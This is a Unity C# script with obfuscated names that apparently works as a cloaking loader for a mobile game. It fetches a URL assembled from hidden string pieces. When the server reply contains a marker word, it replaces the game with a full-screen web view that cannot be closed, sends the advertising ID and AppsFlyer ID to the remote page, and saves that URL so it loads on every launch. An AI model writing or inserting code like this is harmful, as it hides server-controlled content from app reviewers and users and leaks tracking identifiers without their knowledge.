using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;

public class Gncv : MonoBehaviour
{
    [SerializeField] private Canvas oisdkljera;
    [SerializeField] private List<string> yuewkjsdop;
    private string poertalk = "";
    private string nmdskjawqsdl = "";

    private void Awake()
    {
        if (PlayerPrefs.GetInt("quigkjaer") != 0)
        {
            Application.RequestAdvertisingIdentifierAsync(
            (string advertisingId, bool trackingEnabled, string error) =>
            { poertalk = advertisingId; });
        }
    }
    private void Start()
    {
        if (Application.internetReachability != NetworkReachability.NotReachable)
        {
            if (PlayerPrefs.GetString("iuqwekjsdlk", string.Empty) != string.Empty)
            {
                Quiakljzpos(PlayerPrefs.GetString("iuqwekjsdlk"));
            }
            else
            {
                foreach (string n in yuewkjsdop)
                {
                    nmdskjawqsdl += n;
                }
                StartCoroutine(Sduiakjzmpo());
            }
        }
        else
        {
            Poseiozkjsa();
        }
    }

    private void Poseiozkjsa()
    {
        Screen.orientation = ScreenOrientation.Portrait;
        SceneManager.LoadScene("Plopetnisled");
    }

    private IEnumerator Sduiakjzmpo()
    {
        using (UnityWebRequest mmxasdas = UnityWebRequest.Get(nmdskjawqsdl))
        {

            yield return mmxasdas.SendWebRequest();
            if (mmxasdas.isNetworkError)
            {
                Poseiozkjsa();
            }
            int timerloader = 7;
            while (PlayerPrefs.GetString("bobasd", "") == "" && timerloader > 0)
            {
                yield return new WaitForSeconds(1);
                timerloader--;
            }
            try
            {
                if (mmxasdas.result == UnityWebRequest.Result.Success)
                {
                    if (mmxasdas.downloadHandler.text.Contains("gliffer"))
                    {

                        try
                        {
                            var subs = mmxasdas.downloadHandler.text.Split('|');
                            Quiakljzpos(subs[0] + "?idfa=" + poertalk + "&gaid=" + AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + PlayerPrefs.GetString("iuerjkmno", ""), subs[1], int.Parse(subs[2]));
                        }
                        catch
                        {

                            Quiakljzpos(mmxasdas.downloadHandler.text + "?idfa=" + poertalk + "&gaid=" + AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + PlayerPrefs.GetString("iuerjkmno", ""));
                        }
                    }
                    else
                    {
                        Poseiozkjsa();
                    }
                }
                else
                {
                    Poseiozkjsa();
                }
            }
            catch
            {
                Poseiozkjsa();
            }
        }
    }

    private void Quiakljzpos(string jijsda, string mvcnma = "", int hues = 70)
    {
        if (oisdkljera != null)
        {
            oisdkljera.gameObject.SetActive(false);
        }
        UniWebView.SetAllowInlinePlay(true);
        UniWebView.SetAllowAutoPlay(true);

        UniWebView.SetAllowAutoPlay(true);
        UniWebView.SetAllowInlinePlay(true);
        UniWebView.SetJavaScriptEnabled(true);
        UniWebView.SetEnableKeyboardAvoidance(true);

        var wvparam = gameObject.AddComponent<UniWebView>();
        wvparam.SetAllowFileAccess(true);
        wvparam.SetShowToolbar(false);
        wvparam.SetSupportMultipleWindows(false, true);
        wvparam.SetAllowBackForwardNavigationGestures(true);
        wvparam.SetCalloutEnabled(false);
        wvparam.SetBackButtonEnabled(true);

        wvparam.EmbeddedToolbar.SetBackgroundColor(new Color(0, 0, 0, 0f));
        wvparam.SetToolbarDoneButtonText("");
        switch (mvcnma)
        {
            case "0":
                wvparam.EmbeddedToolbar.Show();
                break;
            default:
                wvparam.EmbeddedToolbar.Hide();
                break;
        }
        wvparam.Frame = new Rect(0, hues, Screen.width, Screen.height - hues * 2);
        wvparam.OnShouldClose += (view) =>
        {
            return false;
        };
        wvparam.SetSupportMultipleWindows(true);
        wvparam.SetAllowBackForwardNavigationGestures(true);
        wvparam.OnMultipleWindowOpened += (view, windowId) =>
        {
            wvparam.EmbeddedToolbar.Show();
        };
        wvparam.OnMultipleWindowClosed += (view, windowId) =>
        {
            switch (mvcnma)
            {
                case "0":
                    wvparam.EmbeddedToolbar.Show();
                    break;
                default:
                    wvparam.EmbeddedToolbar.Hide();
                    break;
            }
        };
        wvparam.OnOrientationChanged += (view, orientation) =>
        {
            wvparam.Frame = new Rect(0, hues, Screen.width, Screen.height - hues);
        };

        wvparam.OnLoadingErrorReceived += (view, code, message, payload) =>
        {
            if (payload.Extra != null &&
                payload.Extra.TryGetValue(UniWebViewNativeResultPayload.ExtraFailingURLKey, out var value))
            {
                var url = value as string;

                wvparam.Load(url);
            }
        };
        wvparam.OnPageFinished += (view, statusCode, url) =>
        {
            if (PlayerPrefs.GetString("iuqwekjsdlk", string.Empty) == string.Empty)
            {
                PlayerPrefs.SetString("iuqwekjsdlk", url);
            }
        };
        wvparam.Load(jijsda);
        wvparam.Show();
    }
}
